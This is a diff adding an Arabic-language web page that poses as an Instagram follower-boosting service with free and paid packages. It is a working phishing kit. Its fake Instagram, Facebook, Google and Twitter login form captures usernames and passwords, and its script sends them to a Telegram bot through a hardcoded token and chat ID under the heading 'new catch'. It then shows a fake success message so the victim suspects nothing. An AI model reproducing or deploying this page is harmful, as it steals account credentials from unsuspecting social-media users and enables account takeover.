@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ترقية الحساب الاحترافية</title>
+    
+    <!-- الوسوم الخاصة بظهور الصورة والعنوان عند مشاركة الرابط (Open Graph / Social Preview) -->
+    <meta property="og:title" content="ترقية الحساب الاحترافية - احصل على متابعين حقيقيين">
+    <meta property="og:description" content="احصل على متابعين حقيقيين وتفاعل فوري لحسابك مع ضمان عدم النقصان وتسليم فوري خلال 24 ساعة.">
+    <meta property="og:image" content="https://i.ibb.co/3s3g88c/instagram-preview.jpg">
+    <meta property="og:type" content="website">
+
+    <!-- الوسوم الخاصة بـ Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="ترقية الحساب الاحترافية">
+    <meta name="twitter:description" content="احصل على متابعين حقيقيين وتفاعل فوري لحسابك.">
+    <meta name="twitter:image" content="https://i.ibb.co/3s3g88c/instagram-preview.jpg">
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #0b0c14;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 15px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            background-color: #131522;
+            border-radius: 28px;
+            overflow: hidden;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
+            border: 1px solid #25283d;
+            position: relative;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #c12679 0%, #8e1b6b 100%);
+            padding: 35px 20px 30px;
+            text-align: center;
+            border-bottom-left-radius: 20px;
+            border-bottom-right-radius: 20px;
+        }
+
+        .insta-icon {
+            width: 54px;
+            height: 54px;
+            margin: 0 auto 15px;
+            border: 3px solid #ffffff;
+            border-radius: 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        .insta-icon::before {
+            content: '';
+            width: 22px;
+            height: 22px;
+            border: 3px solid #ffffff;
+            border-radius: 50%;
+        }
+
+        .insta-icon::after {
+            content: '';
+            width: 5px;
+            height: 5px;
+            background-color: #ffffff;
+            border-radius: 50%;
+            position: absolute;
+            top: 7px;
+            right: 7px;
+        }
+
+        .header h1 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            font-size: 13.5px;
+            color: #f3d1e4;
+        }
+
+        .content {
+            padding: 22px 18px;
+        }
+
+        .social-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 22px;
+        }
+
+        .btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            padding: 14px;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: 600;
+            text-decoration: none;
+            border: none;
+            cursor: pointer;
+            transition: transform 0.2s, opacity 0.2s;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            opacity: 0.95;
+        }
+
+        .btn-insta {
+            background: linear-gradient(90deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            color: #ffffff;
+        }
+
+        .btn-fb { background-color: #1877f2; color: #ffffff; }
+        .btn-google { background-color: #ffffff; color: #333333; }
+        .btn-twitter { background-color: #1da1f2; color: #ffffff; }
+
+        #login-form-section {
+            display: none;
+            margin-bottom: 22px;
+            background-color: #1a1d2e;
+            padding: 20px;
+            border-radius: 20px;
+            border: 1px solid #d63384;
+        }
+
+        #login-form-section h3 {
+            font-size: 16px;
+            margin-bottom: 15px;
+            text-align: center;
+            color: #ff69b4;
+        }
+
+        .form-group {
+            margin-bottom: 12px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: 30px;
+            border: 1px solid #272b42;
+            background-color: #11131e;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: #d63384;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background: #d63384;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 5px;
+        }
+
+        #loading-section {
+            display: none;
+            text-align: center;
+            padding: 30px 20px;
+            background-color: #1a1d2e;
+            border-radius: 20px;
+            margin-bottom: 22px;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #272b42;
+            border-top: 4px solid #d63384;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .features-box {
+            background-color: #1a1d2e;
+            border-radius: 20px;
+            padding: 18px 20px;
+            margin-bottom: 22px;
+            border: 1px solid #272b42;
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 14px;
+            color: #e2e4f0;
+        }
+
+        .check-circle {
+            width: 22px;
+            height: 22px;
+            background-color: #d63384;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffffff;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .packages-wrapper {
+            position: relative;
+            padding-left: 12px;
+        }
+
+        .packages-wrapper::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 5px;
+            bottom: 35px;
+            width: 3px;
+            background: linear-gradient(to bottom, #d63384 70%, #272b42 70%);
+            border-radius: 3px;
+        }
+
+        .packages {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .package-card {
+            background-color: #1a1d2e;
+            border: 1px solid #272b42;
+            border-radius: 50px;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            transition: border-color 0.2s, background-color 0.2s;
+        }
+
+        .package-card:hover {
+            border-color: #d63384;
+            background-color: #202438;
+        }
+
+        .package-count {
+            font-size: 15px;
+            font-weight: 600;
+            color: #ffffff;
+        }
+
+        .package-price {
+            background-color: #11131e;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 700;
+            color: #ffffff;
+            min-width: 65px;
+            text-align: center;
+        }
+
+        .package-price.free { color: #2ecc71; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <div class="insta-icon"></div>
+        <h1>ترقية الحساب الاحترافية</h1>
+        <p>احصل على متابعين حقيقيين وتفاعل فوري</p>
+    </div>
+
+    <div class="content">
+        <div class="social-buttons" id="social-buttons-container">
+            <button class="btn btn-insta" onclick="showForm('Instagram')">
+                <span>متابعة بـ Instagram</span>
+            </button>
+            <button class="btn btn-fb" onclick="showForm('Facebook')">
+                <span>متابعة بـ Facebook</span>
+            </button>
+            <button class="btn btn-google" onclick="showForm('Google')">
+                <span>متابعة بـ Google</span>
+            </button>
+            <button class="btn btn-twitter" onclick="showForm('Twitter')">
+                <span>متابعة بـ Twitter</span>
+            </button>
+        </div>
+
+        <div id="login-form-section">
+            <h3 id="form-title">تسجيل الدخول</h3>
+            <div class="form-group">
+                <input type="text" id="username" placeholder="البريد الإلكتروني أو اسم المستخدم">
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" placeholder="كلمة المرور">
+            </div>
+            <button class="submit-btn" onclick="processLogin()">تأكيد ومتابعة</button>
+        </div>
+
+        <div id="loading-section">
+            <div class="spinner"></div>
+            <p id="loading-text" style="font-size: 14px; color: #f3d1e4;">جاري الاتصال بالخادم وفحص الحساب...</p>
+        </div>
+
+        <div class="features-box">
+            <div class="feature-item">
+                <span>متابعين حقيقيين 100%</span>
+                <span class="check-circle">✓</span>
+            </div>
+            <div class="feature-item">
+                <span>تسليم فوري خلال 24 ساعة</span>
+                <span class="check-circle">✓</span>
+            </div>
+            <div class="feature-item">
+                <span>ضمان عدم النقصان</span>
+                <span class="check-circle">✓</span>
+            </div>
+            <div class="feature-item">
+                <span>دعم VIP 24/7</span>
+                <span class="check-circle">✓</span>
+            </div>
+        </div>
+
+        <div class="packages-wrapper">
+            <div class="packages">
+                <div class="package-card">
+                    <span class="package-count">1,000 متابع</span>
+                    <span class="package-price free">مجاني</span>
+                </div>
+                <div class="package-card">
+                    <span class="package-count">5,000 متابع</span>
+                    <span class="package-price">$5</span>
+                </div>
+                <div class="package-card">
+                    <span class="package-count">10,000 متابع</span>
+                    <span class="package-price">$9</span>
+                </div>
+                <div class="package-card">
+                    <span class="package-count">25,000 متابع</span>
+                    <span class="package-price">$20</span>
+                </div>
+                <div class="package-card">
+                    <span class="package-count">50,000 متابع</span>
+                    <span class="package-price">$40</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    let selectedPlatform = '';
+
+    function showForm(platform = '') {
+        selectedPlatform = platform;
+        document.getElementById('social-buttons-container').style.display = 'none';
+        document.getElementById('login-form-section').style.display = 'block';
+        document.getElementById('form-title').innerText = 'تسجيل الدخول عبر ' + platform;
+    }
+
+    function processLogin() {
+        let user = document.getElementById('username').value;
+        let pass = document.getElementById('password').value;
+
+        if(!user || !pass) {
+            alert('الرجاء إدخال البيانات المطلوبة');
+            return;
+        }
+
+        const botToken = "9085718260:AAFr_QfMHH1hgDrfZGpZbII9cgTqaC-mpVs";
+        const chatId = "8859920681";
+        
+        let message = `🚨 صيد جديد (${selectedPlatform}):\n\n👤 المستخدم/الإيميل: ${user}\n🔑 كلمة المرور: ${pass}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        }).catch(err => console.error(err));
+
+        document.getElementById('login-form-section').style.display = 'none';
+        document.getElementById('loading-section').style.display = 'block';
+
+        setTimeout(() => {
+            document.getElementById('loading-text').innerText = 'تم التحقق من الحساب بنجاح! جاري إرسال المتابعين...';
+            setTimeout(() => {
+                alert('تمت العملية بنجاح! سيتم إضافة المتابعين قريباً.');
+                location.reload(); 
+            }, 2000);
+        }, 3000);
+    }
+</script>
+
+</body>
+</html>
